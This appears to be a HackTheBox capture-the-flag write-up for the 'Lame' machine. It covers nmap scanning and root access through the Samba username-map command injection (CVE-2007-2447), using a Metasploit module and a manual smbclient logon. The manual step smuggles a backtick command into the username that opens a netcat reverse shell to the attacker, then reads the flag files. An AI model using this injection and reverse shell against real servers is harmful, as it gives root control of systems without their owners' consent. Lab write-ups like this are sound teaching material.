Lame

HackTheBox · Easy by Brenno M.

Lame is an old Linux box that falls in one step: Samba 3.0.20 hands the username to the shell unsanitized when the username map script option is enabled (CVE-2007-2447), and the command runs as root.

Reconnaissance

Nmap shows FTP, SSH, SMB (139/445) and distccd on 3632. The version scan identifies vsftpd 2.3.4 and Samba 3.0.20-Debian.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p21,22,139,445,3632 <IP>
# 21 vsftpd 2.3.4, 22 OpenSSH 4.7p1, 139/445 Samba 3.0.20-Debian, 3632 distccd

vsftpd 2.3.4 is famous for the :) username backdoor, but the firewall blocks port 6200, which it would open. The way in is Samba.

Exploitation - CVE-2007-2447

A username like /=`command` makes Samba run the command before authentication even happens. Since smbd runs as root, the shell arrives with full privileges.

msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set LHOST tun0
run

Without Metasploit, the same payload goes in smbclient's logon, against the tmp share, which accepts anonymous sessions.

nc -lvnp 4444
smbclient //<IP>/tmp -N -c 'logon "/=`nohup nc -e /bin/sh <MY_IP> 4444`"'
id
cat /home/makis/user.txt /root/root.txt
